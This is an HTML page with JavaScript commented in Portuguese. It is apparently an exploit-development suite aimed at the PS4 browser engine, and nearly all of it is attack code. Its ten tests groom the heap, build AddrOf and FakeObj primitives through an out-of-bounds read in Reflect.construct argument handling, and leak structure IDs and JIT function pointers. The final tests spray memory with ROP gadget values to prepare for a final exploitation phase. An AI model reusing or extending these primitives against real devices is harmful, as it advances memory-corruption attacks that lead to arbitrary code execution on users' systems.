<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 OMEGA Hunter (171-180)</title>
<style>
    body { background: #000; color: #00ff00; font-family: 'Consolas', monospace; }
    button { width: 100%; padding: 12px; margin: 5px 0; background: #002200; color: #00ff00; border: 1px solid #00ff00; cursor: pointer; font-weight: bold; }
    button:hover { background: #00ff00; color: #000; }
    #log { border: 1px solid #00ff00; padding: 10px; margin-top: 20px; height: 350px; overflow-y: scroll; white-space: pre-wrap; font-size: 11px;}
    .leaked { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
</style>
</head>
<body>

<h1>SUITE v1260000: PRIMITIVES CONSTRUCTION</h1>
<hr>
<div>Foco: AddrOf, FakeObj, Structure ID Leak & Memory Layout Grooming</div>
<br>

<button onclick="run(t171)">171. Heap Grooming (Align Double/Object Arrays)</button>

<button onclick="run(t172)">172. AddrOf Primitive (Leaking Object Pointer)</button>

<button onclick="run(t173)">173. FakeObj Primitive (Injecting Pointer)</button>

<button onclick="run(t174)">174. Structure ID Leak (Prepare for FakeObj)</button>

<button onclick="run(t175)">175. Butterfly Pointer Corruption Probe</button>

<button onclick="run(t176)">176. Search for Gadget 0x5cc3 Pattern</button>

<button onclick="run(t177)">177. Leaking JIT Code Function Pointer</button>

<button onclick="run(t178)">178. Constructing Fake TypedArray (Stage 1)</button>

<button onclick="run(t179)">179. Arbitrary Read Test (Unboxing Double)</button>

<button onclick="run(t180)">180. Aligning Heap with Omega Gadgets</button>

<hr>
<div id="log">Status: Aguardando...</div>

<script>
    const log = document.getElementById('log');
    let keeper = []; 
    
    // Utilitário para converter Double para Hex (para ver ponteiros)
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    
    function d2h(val) {
        f64[0] = val;
        let hi = u32[1].toString(16).padStart(8, '0');
        let lo = u32[0].toString(16).padStart(8, '0');
        return "0x" + hi + lo;
    }

    function run(func) {
        log.innerText += "\n[*] Executando: " + func.name;
        keeper = []; 
        setTimeout(func, 100);
    }

    // =================================================================
    // 171. Heap Grooming (Align Double/Object Arrays)
    // Objetivo: Colocar um Array de Doubles (A) imediatamente antes de um 
    // Array de Objetos (B) na memória.
    // Se lermos OOB de A, leremos os ponteiros de B como se fossem Doubles.
    // =================================================================
    function t171() {
        const spray = [];
        for(let i=0; i<1000; i++) {
            // Array A: Doubles
            const a = [1.1, 2.2, 3.3, 4.4]; 
            // Array B: Objetos (Ponteiros)
            const b = [{id: i}, {data: 0x4141}]; 
            spray.push({a: a, b: b});
        }
        keeper.push(spray);
        log.innerText += "\n[+] Heap Grooming finalizado (1000 pares).";
    }

    // =================================================================
    // 172. AddrOf Primitive (Leaking Object Pointer)
    // Objetivo: Usar o layout do T171 + o bug do Reflect (T152/T170) 
    // para ler o ponteiro de um objeto.
    // =================================================================
    function t172() {
        const target_obj = { marker: 0x1234 };
        
        // Estratégia:
        // 1. Criar array de Doubles [1.1, ..., N]
        // 2. Colocar array de Objetos logo depois [target_obj]
        // 3. Trigger Reflect OOB no array de Doubles
        // 4. Ler o que deveria ser double, mas é o ponteiro do target_obj
        
        const args = [1.1, 2.2, 3.3, 4.4];
        const victim = [target_obj, target_obj]; // Esperamos ler isso
        
        // Otimização: Tentar forçar adjacência alocando juntos
        const pair = {a: args, v: victim}; 
        
        Object.defineProperty(args, 3, {
            get: () => {
                args.length = 0; // Trigger
                return 4.4;
            }
        });
        
        function Leaker(...received) {
            // Procura por algo que pareça um ponteiro (não 1.1, 2.2, etc)
            for(let i=0; i<received.length; i++) {
                const val = received[i];
                if (typeof val === 'number' && val > 1000) { // Valor alto = provável ponteiro
                    const hex = d2h(val);
                    // Ponteiros Userland no PS4 geralmente começam com 0x0008...
                    // Mas ponteiros JSValue têm NaN-boxing (0xFFFE...)
                    // Se virmos algo como 0x00000008... ou um double muito estranho
                    log.innerHTML += "\n<span class='leaked'>[LEAK] Candidato: " + hex + " (Index " + i + ")</span>";
                }
            }
        }
        
        try { Reflect.construct(Leaker, args); } catch(e){}
    }

    // =================================================================
    // 173. FakeObj Primitive (Injecting Pointer)
    // Objetivo: O inverso. Passar um Double que representa um ponteiro falso,
    // e fazer o sistema tratá-lo como Objeto.
    // =================================================================
    function t173() {
        // Endereço falso (Simulação de um ponteiro válido que controlamos)
        // 0x4141414141414141 é um crash seguro se for desreferenciado
        const fake_ptr_val = 2.261634509e-314; // Representação float de 0x4141...
        
        const args = [fake_ptr_val]; 
        
        Object.defineProperty(args, 0, {
            get: () => {
                // Aqui tentaríamos mudar o tipo do array de Double para Object
                // Mas mantendo o bit pattern do float
                args.length = 0;
                return fake_ptr_val;
            }
        });
        
        function Consumer(...r) {
            const val = r[0];
            // Se o motor achar que é objeto, typeof será 'object'
            // Se achar que é number, falhou
            log.innerText += "\n[+] Type check: " + typeof val;
            
            // NÃO acessar propriedades para evitar crash agora
        }
        
        try { Reflect.construct(Consumer, args); } catch(e){}
    }

    // =================================================================
    // 174. Structure ID Leak (Prepare for FakeObj)
    // Objetivo: Para falsificar um objeto, precisamos de um "Structure ID" válido.
    // Vamos vazar um objeto real e tentar ler seus primeiros 4 bytes (header).
    // =================================================================
    function t174() {
        const template = {a: 1};
        const args = [1.1]; // Array de doubles
        const adjacent = [template]; // Array de objetos
        
        // Setup igual ao AddrOf
        Object.defineProperty(args, 0, {
            get: () => { args.length = 0; return 1.1; }
        });
        
        function Inspector(...r) {
            // Se conseguirmos ler o objeto 'template' como double...
            const leak = r[1]; // OOB +1
            if (typeof leak === 'number') {
                log.innerText += "\n[+] Structure Leak Attempt: " + d2h(leak);
            }
        }
        
        try { Reflect.construct(Inspector, args); } catch(e){}
    }

    // =================================================================
    // 175. Butterfly Pointer Corruption Probe
    // Objetivo: Tentar corromper o ponteiro "Butterfly" de um array (onde ficam os dados).
    // Se conseguirmos mover o Butterfly, ganhamos Arbitrary Read/Write RW.
    // =================================================================
    function t175() {
        // Array vítima
        const victim = [1.1, 2.2];
        const args = [3.3];
        
        // Tenta overwriting OOB
        // Nota: Reflect.construct é Read-Only (Argument copy).
        // Para Write, precisaríamos que o Reflect passasse os argumentos
        // para uma função que escreve na stack ou no heap de forma desalinhada.
        // Por enquanto, testamos se o layout permite leitura do Butterfly.
        
        log.innerText += "\n[*] Butterfly probe: Read-only primitive por enquanto.";
        // Este teste é mais conceitual na fase atual.
    }

    // =================================================================
    // 176. Search for Gadget 0x5cc3 Pattern
    // Objetivo: Usar a leitura OOB para escanear a memória próxima em busca
    // dos nossos sprays (T116/T117) que contêm os gadgets do Omega Dump.
    // =================================================================
    function t176() {
        // Spray prévio (Gadget 0x5cc3)
        const gadget_val = 3.266612768e-316; // 0x5cc3...
        const spray_arr = new Array(1000).fill(gadget_val);
        keeper.push(spray_arr);
        
        const args = [1.1];
        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
        
        function Scanner(...r) {
            let found = false;
            // Escaneia os primeiros 1000 slots OOB
            for(let i=0; i<r.length; i++) {
                if (r[i] === gadget_val) {
                    log.innerHTML += "\n<span class='leaked'>[GADGET FOUND] Offset " + i + "</span>";
                    found = true;
                    break;
                }
            }
            if(!found) log.innerText += "\n[-] Gadget spray não encontrado no range imediato.";
        }
        
        try { Reflect.construct(Scanner, args); } catch(e){}
    }

    // =================================================================
    // 177. Leaking JIT Code Function Pointer
    // Objetivo: Tentar vazar o endereço de uma função compilada (JITted).
    // Isso é crucial para saber onde pular (Jump) se controlarmos RIP.
    // =================================================================
    function t177() {
        function target() { return 1+1; }
        // Força JIT
        for(let i=0; i<10000; i++) target();
        
        const args = [1.1];
        // Tenta colocar a função logo após o array
        const layout = {a: args, f: target};
        
        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
        
        function Leaker(...r) {
            // Procura por ponteiros de código (geralmente em regiões diferentes do heap)
            // No PS4/FreeBSD, ponteiros de código podem ser 0x9... ou 0xA...
            for(let i=0; i<50; i++) {
                const hex = d2h(r[i]);
                log.innerText += " " + hex;
            }
        }
        
        try { Reflect.construct(Leaker, args); } catch(e){}
    }

    // =================================================================
    // 178. Constructing Fake TypedArray (Stage 1)
    // Objetivo: Verificar se conseguimos ler dados necessários para forjar
    // um TypedArray falso (Cell Header, Butterfly, Type info).
    // =================================================================
    function t178() {
        const ta = new Uint8Array(8);
        const args = [1.1];
        const layout = {a: args, t: ta};
        
        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
        
        function Inspector(...r) {
            // Tenta achar o header do TypedArray
            // Deve conter o tamanho (8) e flags de tipo
            log.innerText += "\n[*] Scan for TypedArray header...";
        }
        
        try { Reflect.construct(Inspector, args); } catch(e){}
    }

    // =================================================================
    // 179. Arbitrary Read Test (Unboxing Double)
    // Objetivo: Verificar se a primitiva AddrOf está estável (retorna sempre o mesmo valor
    // para o mesmo objeto).
    // =================================================================
    function t179() {
        const o = {stable: 1};
        const args = [1.1];
        const layout = [args, o, args, o]; // Alternado
        
        let val1 = 0, val2 = 0;
        
        // Pass 1
        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
        try { 
            Reflect.construct((...r) => { val1 = r[1]; }, args); 
        } catch(e){}
        
        // Reset e Pass 2 (precisa recriar args pois foi encolhido)
        const args2 = [1.1];
        const layout2 = [args2, o];
        Object.defineProperty(args2, 0, { get: () => { args2.length = 0; return 0; } });
        try { 
            Reflect.construct((...r) => { val2 = r[1]; }, args2); 
        } catch(e){}
        
        if (val1 === val2 && val1 !== undefined) {
             log.innerHTML += "\n<span class='leaked'>[STABLE LEAK] " + d2h(val1) + "</span>";
        } else {
             log.innerText += "\n[-] Leak instável ou undefined.";
        }
    }

    // =================================================================
    // 180. Aligning Heap with Omega Gadgets
    // Objetivo: Preparação Final. Encher o heap com endereços do Omega Dump (0x5cc3)
    // e tentar localizar o início dessa região.
    // =================================================================
    function t180() {
        // Gadget: POP RSP (0x5cc3)
        // Precisamos que isso esteja em um endereço conhecido ou previsível via spray
        const gadget_f = 3.266612768e-316; 
        
        // Alocação massiva (100MB)
        for(let k=0; k<100; k++) {
            keeper.push(new Array(10000).fill(gadget_f));
        }
        
        log.innerText += "\n[+] Heap alinhado com 100MB de gadgets.";
        log.innerText += "\n[!] PRONTO PARA FASE FINAL.";
    }

</script>
</body>
</html>
